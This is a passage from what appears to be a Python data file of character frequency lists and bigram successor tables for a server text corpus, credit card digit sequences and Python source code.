'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'd', 'f', 'g', 'j', 'l', 'm', 'n', 'q', 'r', 'v', 'x', 'z', '{', '|', '}', '~'], 'r': ['e', ' ', 'i', 'a', 'd', 'o', 'y', 'k', 's', 'c', 't', 'g', 'f', '-', 'l', 'n', 'r', 'u', '.', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'h', 'j', 'm', 'p', 'q', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'u': [' ', 't', 's', 'n', 'r', 'd', 'a', 'g', 'c', 'b', 'e', 'i', 'h', 'l', 'p', ',', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'f', 'j', 'k', 'm', 'o', 'q', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 't': ['h', ' ', 'o', 'e', 'i', 's', 'a', 'r', '.', 't', 'l', 'u', 'y', ',', 'c', '?', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'd', 'f', 'g', 'j', 'k', 'm', 'n', 'p', 'q', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'w': ['i', 'h', 'e', 'o', 'a', 's', ' ', ',', 'l', '.', 'r', 'v', 'n', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'j', 'k', 'm', 'p', 'q', 't', 'u', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'v': ['e', 'i', 'a', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'y': ['o', ' ', ',', 's', 'a', 'i', '.', 'b', ';', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'c', 'd', 'e', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'x': ['c', 'e', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'd', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'z': ['o', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~']}
characters_by_freq_test_server = [' ', 'e', 't', 'o', 'a', 'n', 'r', 'i', 's', 'h', 'd', 'l', 'u', 'g', 'm', 'y', '.', 'f', 'c', ',', 'w', 'b', 'p', 'v', 'k', 'I', 'W', 'E', 'T', '-', 'A', '?', 'O', 'N', 'D', '%', 'S', 'j', 'C', 'B', ';', 'G', 'F', 'H', 'M', 'L', 'q', 'x', '!', '3', '2', '4', '6', '9', 'K', 'P', 'R', 'V', 'Y', 'Z', 'z']

diagraphs_credit_cards = {'1': ['6', '4', '3', '5', '7', '0', '1', '8', '2', '9'], '0': ['0', '7', '2', '4', '5', '3', '1', '9', '8', '6'], '3': ['4', '7', '2', '9', '5', '3', '1', '8', '6', '0'], '2': ['4', '9', '3', '5', '0', '2', '6', '1', '7', '8'], '5': ['3', '5', '4', '1', '2', '6', '8', '7', '9', '0'], '4': ['5', '9', '0', '4', '8', '7', '3', '1', '6', '2'], '7': ['1', '4', '3', '5', '0', '2', '6', '8', '7', '9'], '6': ['4', '3', '5', '7', '9', '6', '8', '0', '1', '2'], '9': ['2', '1', '4', '3', '5', '7', '8', '0', '9', '6'], '8': ['4', '6', '3', '5', '9', '7', '2', '1', '0', '8']}
characters_by_freq_credit_cards = ['4','5','3','7','2','9','6','1','0','8']

diagraphs_python = {' ': [' ', 't', 's', 'i', 'a', '=', 'd', 'f', 'r', 'c', "'", 'o', '(', 'e', '"', 'p', 'n', 'u', 'm', '#', 'w', 'b', 'l', 'v', '%', 'T', 'g', '_', 'h', 'N', 'C', 'S', '[', 'F', 'I', '1', 'A', '{', 'G', 'P', 'D', 'M', 'O', '-', '*', 'R', '+', 'k', '2', '/', '`', 'E', '}', '0', 'U', 'L', 'q', 'y', 'W', 'j', '<', 'B', 'H', '3', ':', 'V', '>', 'x', ')', '4', '.', '&', '@', '5', '\n', '!', 'J', 'z', 'K', '|', '\\', '8', 'Y', '6', '9', ']', '7', 'Q', 'X', 'Z', ',', '$', ';', '^', '?', '~'], '$': ["'", '%', ')', '"', ' ', '\\', 'd', 'J', '-', 'P', 's', 'f', 'h', '&', 'p', '.'], '(': ["'", 's', ')', 'r', '"', 'f', 'p', 'c', 'o', 't', 'u', 'm', 'a', 'l', 'i', 'v', 'd', 'w', '\n', 'n', 'e', '1', '[', '2', 'T', '(', 'g', 'b', '?', '*', '0', '_', 'k', '3', 'F', 'G', 'C', '5', 'S', '{', '4', 'B', 'N', 'h', '%', 'A', '-', 'V', 'E', '8', 'x', 'L', 'P', 'I', 'M', 'q', '6', 'D', 'O', '9', 'U', '\\', ' ', 'y', 'R', 'W', 'j', 'H', '`', '#', 'z', '7', '.', '+', 'K', 'Q', 'Y', '|', '/', 'J', '&', '^', '<', 'X', '>', '!', '='], ',': [' ', '\n', "'", ')', '2', '1', '"', '0', '3', 'A', 'P', '(', '5', '-', '6', 'U', 'S', '4', 'D', 'b', '%', 'i', '\\', 'v', '8', 'k', 'm', 't', 'G', 'j', 'p', '}', '9', 'L', 'n', ',', '.', 'N', 'T', 'a', 'e', '|', 'J', 'u', '*', '7', 'E', '[', 'c', 'd', 'l', 'q', 's', 'w', '{', '!', ':', 'B', 'V', 'Y', ']', 'y'], '0': ['0', '1', ',', ')', ']', "'", ' ', '4', ':', '.', '"', '-', '2', '8', '5', '3', '\n', '7', '6', '9', 'd', '\\', 'a', '/', '<', 'N', 'n', 'x', 'A', 'c', 'e', '}', 'm', '=', '%', '(', 'f', '_', '*', 'M', 'k', 't', 'b', 'E', '+', 'D', 'F', 'Z', 'p', 'r', '{', 'X', '`', 'C', 'B', '^', 'l', 'o', 'w', '|'], '4': ['0', ',', ' ', "'", ')', '2', '"', '3', '.', '5', ':', '4', '1', '8', '(', '\n', '<', '_', '7', '-', '9', '6', ']', '/', 'd', '\\', 'e', '}', 'x', '*', '=', 'c', 'a', '%', 'T', '[', 's', 'f', '`', 'm', 't', '>', 'F', 'M', 'b', 'h'], '8': [',', "'", '0', ' ', '.', '2', '3', '4', '"', '1', '9', ')', 'n', 'a', '5', '8', '7', '6', '<', '/', 'N', '-', '\n', '\\', '_', 'h', '(', 'c', ':', ']', 'b', 'd', 'o', 'D', 'f', '}', '%', 'C', '`', 't', 'x'], '<': ['/', 'o', 'l', 'i', 's', ' ', 't', 'p', 'u', 'a', 'b', '=', 'h', 'd', 'm', 'e', 'f', '"', 'y', '%', 'A', 'B', '1', 'c', '5', 'r', '-', '?', 'n', '>', 'v', '|', '!', '2', 'D', 'F', 'M', 'P', 'w', "'", '0', '<', 'E', 'I', 'N', 'R', 'g', '&', 'L', 'O', 'T', 'W', '`', 'j', 'x'], '@': ['r', 'p', 'e', 's', 'c', 'f', 'w', 'n', "'", '(', 'o', '|', 'd', 'm', 'l', 'v', 'b', ' ', '#', '"', '%', '+', '[', 'x'], 'D': ['e', 'o', 'E', 'a', 'i', 'A', 'I', 'j', ' ', "'", '_', 'r', 'B', 'D', 'S', 'L', 'O', '(', 'R', '\n', 'u', 'U', ')', ',', 'J', '=', '8', 'N', '[', '.', 'C', 'F', 'M', '5', 'y', '"', '2', 'T', 'P', 's', '4', ':', 'K', '\\', 'v', '1', 'G', 'V', 'l', '%', 'H', 'W', 'g', 'p', 'x'], 'H': ['T', 'O', 'a', 'E', 't', 'A', 'e', 'o', "'", ' ', 'i', 'S', 'I', '_', ':', '.', 'U', 'u', 'P', 'R', 'r', 'H', 'v', '\n', 'M', ',', 'B', 'y', '%', '=', 'N', ']', '"', ')', 'C', 'D', 'G', 'K', 'l', 'n', 'p'], 'L': ['E', 'i', 'I', ' ', 'o', 'A', 'a', 'O', '_', 'T', 'L', 'e', "'", 'U', 'Y', 'D', ':', 'C', '\n', '1', 'S', '.', ')', ',', 'P', 'B', 'H', 'u', 's', '"', '(', 'c', 'R', 'F', '-', ']', 'G', 'j', 'N', 'W', '=', 'n', '/', ';', 'V', '}', 'K', 'J', 'M', 'X', '`', 'l', 't'], 'P': ['o', 'a', 'O', 'A', 'y', 'r', 'S', 'R', 'e', 'T', '<', "'", '_', 'E', ' ', 'L', 'P', 'I', 'v', 'U', 'l', 'M', 'i', 'u', '"', 'H', 'B', ')', 'K', 'Y', '\n', 'G', 'd', ',', 'D', 'N', '.', ':', 'C', 'h', 't', '(', ';', 'V', 's', '-', '1', '=', 'F', 'W', 'Z'], 'T': ['e', 'r', 'h', 'E', 'y', '_', 'I', 'M', 'A', ' ', 'H', 'R', 'T', 'i', 'Y', "'", 'o', 'O', 'S', 'a', 'P', '(', ',', 'u', '\n', 'U', 'Z', 'F', ')', '.', '[', 'C', 'D', 'N', 'B', 'w', 'W', '"', '*', ':', 'L', 's', '1', 'X', 'x', '/', 'G', ']', '0', 'V', 'l', 'v', '|', '+', '-', '7', '6', '=', '`', 'z'], 'X': [' ', 'T', '_', 'X', "'", 'M', 'E', '-', 'C', 'I', ',', '"', 'V', '\n', ')', '(', '.', 'A', ':', 'S', ']', 'H', 'P', 'Y', 't', 'D', 'F', 'O', 'R', '\\', 'u'], '\\': ['n', 'u', 'd', '\\', 'x', '\n', "'", 's', '"', 't', '.', 'w', ']', 'r', '[', '+', '0', ':', ')', '(', '/', '?', '*', 'b', '{', ' ', '}', '^', 'f', '$', '1', '|', '-', 'S', 'g', '%', '&', 'C', 'E', 'P', 'T', 'W', 'e', 'o', 'v'], '`': ['`', ' ', '.', ',', '\n', 'c', 's', 'f', 't', 'g', 'o', ')', 'a', 'm', '{', 'd', 'N', 'e', 'n', 'r', 'F', 'D', 'T', 'u', 'i', 'w', 'p', 'l', '(', 'S', '<', '"', 'C', 'U', 'L', 'O', '_', 'G', 'M', 'v', 'H', ']', 'b', 'I', '\\', '%', "'", '/', ':', '=', '>', 'E', 'W', '[', 'h', '}', '!', '#', '&', '-', ';', 'A', 'B', 'P', 'R', 'y', 'x', 'z'], 'd': ['e', ' ', 'i', 'a', '_', '(', 'o', 'j', 's', '.', 'd', 'u', ',', 'l', '\n', ')', "'", 'r', 'b', '=', 'g', '"', 'm', ':', 'E', 'y', 't', '/', '1', 'n', 'D', 'F', 'T', '-', '[', 'M', ']', 'f', '>', 'S', 'z', '+', 'O', '2', 'x', 'c', 'C', 'N', '\\', '`', '{', 'p', 'H', ';', 'w', '5', 'I', '3', 'v', 'W', 'P', '4', 'A', 'k', 'R', '0', '<', 'h', 'U', '&', '|', 'Q', '6', '8', 'G', '*', 'B', '}', '?', '%', '@', '$', 'L', 'V', '9', '#', '7', 'K', '!'], 'h': ['e', 'a', 'o', 'i', ' ', 't', '.', '_', '/', 'r', '(', ')', ',', "'", 'u', 's', 'm', '\n', 'n', '>', 'l', '=', '"', 'd', ':', 'y', '1', 'b', '2', '-', '[', 'p', 'F', ']', '0', 'h', 'M', 'V', '`', '<', 'G', 'H', 'A', 'c', 'f', 'j', '}', '3', ';', 'D', 'I', 'N', 'Q', 'R', 'w', '$', 'E', 'T', '+', '?', 'L', 'g', 'k'], 'l': ['f', 'e', 'i', 'a', 'u', 'd', 's', 'o', 'l', 't', '(', ' ', 'y', '_', '.', "'", ',', ')', '>', 'p', '\n', '=', '"', 'v', '[', 'b', 'g', 'c', 'r', ':', 'n', 'R', '-', 'm', '/', '1', 'h', 'k', 'w', ']', 'j', 'B', 'F', 'T', '<', '2', 'A', '`', 'C', 'I', '#', 'M', 'H', ';', 'N', 'P', '0', 'D', '\\', 'E', '*', 'q', '|', '%', 'z', 'U', '3', 'V', '4', '@', 'K', 'L', 'x', '}', '!', '$', '5', '6', '?', 'G', 'S', 'W'], 'p': ['e', 'a', 'o', 't', 'l', 'r', 'p', 'u', 'i', ' ', '_', '(', 's', 'y', '.', 'k', 'd', ':', ',', '>', 'h', 'n', ')', ';', '=', '\n', "'", 'f', 'v', '[', 'R', ']', 'g', 'C', 'c', '1', 'T', '4', '2', 'F', '/', 'E', '"', 'm', 'x', 'I', 'b', 'D', 'S', '3', 'M', '-', 'w', 'U', '`', '+', '0', '}', 'A', 'N', '&', '<', 'G', 'P', '%', '@', 'O', '\\', 'q', '|'], 't': ['e', 'h', ' ', 'i', 'r', 'a', 'o', '_', 'u', 's', 't', '(', 'y', '.', 'E', ',', ')', 'p', '\n', "'", '"', 'c', 'l', 'C', 'T', '/', ':', 'm', '=', '[', 'R', 'F', 'd', 'H', 'I', 'f', '-', 'w', '>', 'M', ';', 'z', 'N', 'U', '0', 'S', '1', 'A', '2', 'D', 'b', '`', 'n', 'L', 'v', 'P', ']', 'x', 'V', 'G', 'O', 'g', '<', '@', '3', 'Q', '+', '\\', 'W', '4', '|', '*', 'j', '}', 'B', '%', 'k', '&', '6', 'Z', '5', 'X', 'Y', '8', '7', '?', '!', '9', 'K', '$', '#', '{', 'q'], 'x': ['t', 'c', 'p', 'a', 'i', ' ', '_', 'e', ',', ')', 'E', '(', '.', '"', 'm', '=', 'r', 'y', '&', ':', '\n', "'", 'd', 'f', '<', ']', '>', '[', 'h', '-', '1', 'l', 'U', '8', 'k', '0', '3', '2', 'o', 'F', 'I', 'L', '+', 'b', '/', 'O', 'R', 'g', 's', 'v', 'x', 'P', 'S', 'Y', 'X', '7', '9', 'M', 'V', '`', 'D', ';', 'N', 'T', 'u', '}', '4', 'C', 'H', '\\'], '|': [' ', '\\', 'c', 'l', 'f', 't', '\n', 's', '!', 'u', 'd', 'p', 'e', 'r', '"', '=', '<', 'a', 'j', '|', '(', '~', '^', '>', 'w', "'", '-', '$', ',', 'm', '&', ';', 'A', '@', '[', 'i', ')', 'M', 'G', 'L', '%', '.', '1', ':', '?', 'P', 'W', ']', 'o', 'v'], '#': [' ', '#', '\n', '1', '3', '.', 'h', '7', 'd', '8', 'l', '5', 'e', '-', '/', 's', '!', '4', '"', '0', '9', "'", '2', ':', 'G', 'T', 'c', 't', 'w', 'a', 'b', 'f', 'p', 'r', '$', 'I', 'R', '\\', '}', '(', '6', ';', 'F', 'S', 'i', 'n', '%', ')', 'A', '@', 'D', 'H', 'N', 'W', 'V', '`', 'm', 'o'], "'": [',', ')', ':', ' ', ']', 's', '\n', 't', 'c', 'f', '/', 'a', 'd', "'", '%', 'm', 'P', 'S', 'r', '.', 'p', '1', 'n', 'i', 'T', 'C', 'G', 'M', 'e', '<', 'l', '2', 'N', 'b', 'R', 'A', 'o', 'g', 'h', '\\', 'B', 'D', 'L', '"', '-', '{', 'k', 'v', 'I', '}', '0', 'K', 'V', 'u', 'E', '^', '_', 'F', 'J', 'w', 'O', '3', 'U', '4', 'W', 'H', '5', 'j', '6', 'Z', '7', '8', 'y', '(', '9', 'z', 'Y', '[', '#', '+', 'X', 'x', '*', 'q', '$', ';', '?', 'Q', '=', '&', '|', '>', '@', '`', '!', '~'], '+': [' ', '=', ')', '-', '\n', '1', '"', '+', '\\', '|', '(', '0', "'", '/', 'l', '.', '$', 'd', 's', '4', ']', '2', 'a', 'e', 'n', 'p', 'x', '3', '[', 'i', 'k', '#', ',', '?', 'b', 'f', 't', '5', '6', 'E', 'N', 'c', 'h', 'u', 'v', 'y'], '/': ['/', 't', 'o', 'p', '>', 's', 'l', "'", 'j', 'c', 'a', 'd', '%', 'b', 'm', 'e', 'f', '"', '2', ' ', 'u', 'w', 'r', '$', '1', '(', '0', 'g', 'h', 'v', 'n', 'i', '?', '\\', '\n', 'x', '^', '3', '[', ',', '=', 'P', '#', '*', 'L', '<', 'O', '4', 'C', ')', 'A', ']', '|', 'E', 'D', 'H', '8', 'F', 'M', 'R', '`', '&', '+', '.', '5', '6', '9', ';', 'B', 'G', 'I', 'S', 'W', 'Y', 'k', 'q', 'y', '~', '-', ':', 'K', 'N', 'U', '{'], '3': ['0', '3', ',', '2', "'", '"', '.', ')', '4', ' ', ':', '1', '7', '5', '6', '8', '<', ']', '9', 'd', '\n', '-', '_', 'D', '(', ';', '/', 'C', '}', '%', '&', 'E', 'c', 'r', '>', '\\', 'b', 'e', 'f', 'F', 'T', 'a', '|', '*', 'k', 'l', '+', '@', 'L', 'R', 'g', 'h'], '7': [',', '4', '.', '0', '8', "'", '2', '"', '1', 'e', ' ', ')', '7', '5', '6', '9', '3', '\\', 'd', '<', '-', ':', '/', ']', '_', '\n', '(', 'a', 'b', 'g', 'f', 's', '!', 'F', 'c', '}', 'T', 'r', 't', 'v'], ';': [' ', '"', '\n', 'y', "'", 'b', '\\', 's', 'a', '}', '&', '1', 'q', 't', '%', '/', '<', '`', 'x', 'e', 'S', '|', '#', ')', 'h', 'm', 'l', ';', 'P', 'd', 'f', '$', ',', '.', 'A', 'U', ']', 'c', 'g', 'k', 'o', 'p', 'v'], '?': ['P', ':', '\n', "'", 'x', '"', '!', ' ', ')', 'p', '\\', 'c', 't', '/', '?', '$', 'n', '|', '>', 'f', 'm', '(', '=', '<', 'u', '*', '^', 's', '#', '-', '.', 'L', '[', 'i'], 'C': ['o', 'a', 'h', 'O', 'l', 'E', 'H', 'A', 'S', 'r', 'T', ' ', 'K', "'", 'L', 'u', '_', 'e', 'I', 'i', 'R', 'C', 'D', 'G', 'F', 'U', 'y', 's', 'N', '(', '3', '\n', 'V', 'Z', 'm', ')', ':', '/', 'M', 'z', '%', '.', '0', '4', 'P', 'Y', '\\', 'c', 'b', 't', '"', '+', '-', ',', '2', '5', '<', 'B', 'J', 'x'], 'G': ['e', 'E', 'R', 'I', 'o', "'", 'D', '"', 'S', 'r', 'O', 'U', ' ', 'i', 'T', 'N', 'C', 'L', 'M', '_', 'P', 'a', ':', '=', '(', 'H', 'u', 'A', 'l', '\n', 'B', 'G', 'x', ',', 'J', 'w', ')', 'F', 'Z', 'z', '|', '!', 'd', 'V', 'j', 'm', 'y'], 'K': ['e', 'E', 'T', 'a', 'B', 'I', '_', 'o', "'", 'r', 'M', 'L', ' ', 'i', 'u', 'U', 'D', 'A', 'S', ')', '(', ':', 'R', '\n', 'Y', 'n', ',', '.', 'C', 'h', 'y', 'N', 'l', '"', '/', 'F', 'H', 'K', 'Z', 'j', 's', '=', 'G', 'X', 'w'], 'O': ['S', 'R', 'G', 'N', 'I', 'T', 'F', 'b', 'M', 'C', 'D', 'p', 'O', 'L', 'K', 'r', '_', 'U', 'n', 'u', "'", ' ', 't', 'f', 'P', 'V', 'J', 'W', 'v', '(', 'A', '\n', 'E', 'c', ':', ',', '.', 'l', 's', 'B', 'X', 'H', 'k', 'Y', 'i', 'h', '2', '=', '\\', 'g', 'o', 'x', ')', '-', 'Q', 'a', 'd', 'm'], 'S': ['e', ' ', 't', 'E', 'T', 'o', 'i', 'G', '_', "'", 'p', 'I', 'u', 'S', 'a', 'R', 'Q', 'O', 'y', '\n', 'C', 'P', '[', 'h', 'F', 'A', 'H', 'k', ')', ',', ':', 'c', 'L', 'U', 'm', 'W', '"', '.', 'l', 'K', '(', '8', 'D', 'V', 'B', 'M', ']', 'v', '/', '=', '-', 'r', '1', 'Y', 'w', '|', ';', '`', 's', 'N', '2', '5', 'n', '!', '7', 'J', 'Z'], 'W': ['i', 'e', 'K', 'a', 'A', 'h', 'S', 'r', 'G', 'H', 'O', 'o', 'W', 'I', 'E', "'", '_', 'D', 'V', 'B', ' ', 'Y', 'N', '\n', '/', 'L', 'R', ',', '3', 'y', '%', ')', ':', 'C', 'U', '[', 'k', 'u'], '[': ["'", '0', '"', ']', '1', ':', 'i', 'u', 's', 'f', '(', 'c', '-', 'm', 'a', '\n', 'o', 'n', '2', 'l', 'k', '^', 'p', 'd', 't', 'N', 'e', 'r', '\\', '{', '%', 'G', 'v', '3', '[', 'L', ' ', 'T', 'b', 'R', '4', 'g', 'j', 'x', 'A', 'C', 'D', 'J', '5', 'O', '7', '.', 'h', 'z', '_', 'M', 'P', 'X', '|', '/', '6', '9', 'B', 'q', 'w', '+', '*', '8', 'E', 'F', 'I', 'Z', 'y'], '_': ['c', '_', 's', 'f', 't', 'm', 'n', 'd', 'p', 'i', 'l', 'r', 'a', '(', 'o', 'u', 'v', 'e', 'g', 'h', 'w', 'b', 'k', 'C', 'F', 'P', 'D', 'A', ' ', 'T', 'S', 'q', 'N', 'U', 'I', '1', 'M', '"', ')', 'L', 'E', '\n', "'", 'y', 'R', '2', 'j', ',', 'B', 'V', '.', 'G', '0', 'O', 'x', 'H', '4', 'K', 'W', '3', '%', 'z', '*', '[', 'J', ']', '8', '`', 'Z', ':', 'X', '=', '\\', '-', '6', 'Y', '5'], 'c': ['o', 't', 'e', 'h', 'l', 'a', 'k', 'r', 'u', 'i', 's', '_', 'c', ' ', '.', '=', '(', 'T', ')', "'", ',', 'm', 'f', 'y', '\n', '2', 'z', '1', 'd', 'g', 'n', '/', '3', '-', '4', '"', 'F', 'I', '[', 'R', ':', 'w', '5', 'E', '\\', 'x', '0', 'b', 'q', '>', 'N', 'S', 'C', 'P', ']', 'p', '`', '%', 'M', '7', '6', '8', 'H', 'O', ';', 'j', '9', 'A', 'v'], 'g': ['e', ' ', 's', 'o', 'i', 'r', 'u', 'n', '.', 'a', ')', '_', 'g', 'l', 't', '(', ',', 'h', '\n', "'", '=', 'd', ':', '"', '/', 'I', 'y', '1', 'f', 'N', 'v', '[', 'm', '2', '>', 'L', 'c', 'D', ']', 'z', '-', '\\', 'R', 'T', '0', '`', 'M', 'b', '<', 'F', 'P', 'U', 'k', 'p', '}', '!', '?', 'C', 'S', '|', ';', 'x', 'A', 'E', '#', 'V', 'j', 'w', '$', '&', 'G', 'H', 'O', 'X', 'q'], 'k': ['e', 'i', ' ', '_', 'w', 'a', 's', 't', 'u', 'b', "'", 'l', 'o', '.', '(', '\n', ')', 'n', '=', ',', 'm', 'r', 'd', ']', ':', 'k', 'F', 'y', '"', 'j', '-', '/', '[', 'f', 'c', 'g', 'h', '1', 'E', 'L', '>', 'S', '2', 'N', '`', 'v', 'T', '}', 'I', 'M', '!', '+', 'C', 'P', '\\', '6', ';', 'A', 'K', 'R', 'V', 'x'], 'o': ['n', 'r', 'm', 'd', 'u', 't', 'p', ' ', 'l', 'b', 's', 'f', 'i', 'o', 'c', 'w', '.', 'k', '_', 'a', 'v', 'g', 'e', "'", '/', 'x', '\n', 'j', '"', '-', ',', 'h', ')', '(', 'I', '=', 'y', '<', ':', 'A', '[', '\\', 'S', 'z', 'M', 'F', 'R', '@', 'D', '&', 'J', 'C', ']', '`', '>', 'T', 'V', '+', 'P', 'O', 'q', 'N', 'H', 'W', '%', '2', 'E', 'K', 'Q', 'U', '#', '$', '1', '3', 'B', 'L', '{', '|'], 's': ['e', 't', ' ', 's', '.', 'i', '_', 'u', 'p', 'a', '(', 'o', ')', ',', '\n', 'h', "'", 'c', ':', 'k', '"', '[', 'r', '=', 'l', 'y', 'g', '/', 'q', 'w', '-', 'n', ']', '1', 'f', 'm', '2', 'N', 'z', '3', '\\', 'd', '`', 'C', 'F', '%', '4', 'T', '<', '*', 'M', '>', 'v', 'I', ';', 'j', '0', 'B', 'H', '+', 'S', 'E', 'U', 'b', 'O', 'R', '?', '$', 'V', 'D', '}', '!', 'A', '&', 'L', 'P', '|', '{', 'x', 'G', 'W', '8', '@', '#', 'Z', '5'], 'w': ['i', 'a', 'e', 'o', 'h', 's', ' ', '_', 'r', '.', 'k', 'n', '(', 'w', ')', "'", ',', 'l', '\n', '/', 'd', '1', '"', '[', 'T', '3', 'y', 'M', '=', 'u', '-', 'L', '+', ':', ']', '2', 'A', '4', 'I', 'c', 'Q', '`', 'D', 'H', 'b', '5', '7', '6', '9', '8', 'f', '|', '*', 'V', 'E', 'N', '\\', 'v', '}', 'F', 'g', 't', 'x'], '{': ['%', "'", ' ', '{', '\n', '}', '"', '1', '4', 'y', 'm', 'x', '0', 'f', '|', '#', 'O', 'N', ',', '3', '7', 'M', 'T', '\\', '`', 's', 'u', '(', '-', '2', 'A', 'C', 'P', '[', 'b', 'i', 'o'], '\n': [' ', '\n', 'f', '#', '<', 'c', 'd', 'i', '"', '@', 'g', ')', 'T', 'e', 't', '_', 'S', 's', 'A', 'a', 'C', 'D', 'R', 'r', 'G', 'u', 'p', 'F', 'P', 'w', 'U', 'h', 'E', 'l', 'M', 'm', '}', 'L', 'n', 'I', 'O', 'N', 'W', 'o', 'b', 'H', 'B', 'v', ']', '%', 'Y', '(', '>', '`', 'Q', 'V', "'", '*', '1', 'J', 'X', '-', '.', '3', '2', 'K', '[', 'j'], '"': ['"', '\n', ' ', ')', ',', '>', 't', 'a', ':', 'R', 's', 'T', 'c', ']', '%', '/', '2', '1', 'i', 'E', 'h', '<', "'", 'C', 'p', 'b', 'f', 'd', 'n', 'S', 'r', 'A', 'e', 'm', 'G', 'P', 'D', '.', 'I', '{', 'N', '3', 'x', 'L', 'K', '\\', 'F', 'J', '0', '4', 'W', 'H', 'M', 'U', 'o', '}', '5', '_', 'u', 'V', '&', '8', 'l', '7', '6', '9', 'O', 'v', 'j', 'g', '(', 'B', '-', 'w', ';', 'k', 'Y', '|', 'y', '#', '[', '*', 'q', '^', 'X', '`', '$', '?', '!', '=', '+', 'Z', 'z', '~', '@', 'Q'], '&': ['a', ' ', 'b', 'q', 'g', 'l', 'y', '#', '"', '\\', '&', 'c', 'p', "'", 'm', '<', 'n', '|', '%', ',', '=', 's', '(', '*', '.', 'A', 'f', 'x'], '*': ['*', ' ', 'k', 'a', '-', 'o', 's', '\n', "'", ')', '(', 'f', '/', '?', '{', 'n', 't', '=', 'd', '.', '"', '\\', 'm', ',', 'T', 'e', 'i', '6', 'c', 'p', '$', '2', '|', '>', 'F', 'r', 'u', 'v', '%', 'b', '~', '+', '8', ':', 'N', '_', '`', 'l', '1', '3', '7', '[', 'q', 'w', '9', ';', '@', 'G', 'h'], '.': ['a', '\n', 'c', 'g', 's', '_', ' ', 'p', 'r', 'f', 'm', 't', 'o', 'd', 'e', 'u', '"', 'i', 'n', 'w', 'l', 'h', "'", '.', 'j', 'v', 'b', '0', 'q', 'T', '1', '2', 'M', 'D', '%', 'S', 'P', 'L', '5', 'C', 'k', '4', 'x', '3', 'I', 'V', 'A', 'O', 'U', ',', '\\', 'F', 'y', '<', 'H', '6', ')', 'G', 'E', '7', '*', 'N', '{', 'B', '8', '9', 'R', '/', '[', ']', 'z', 'W', 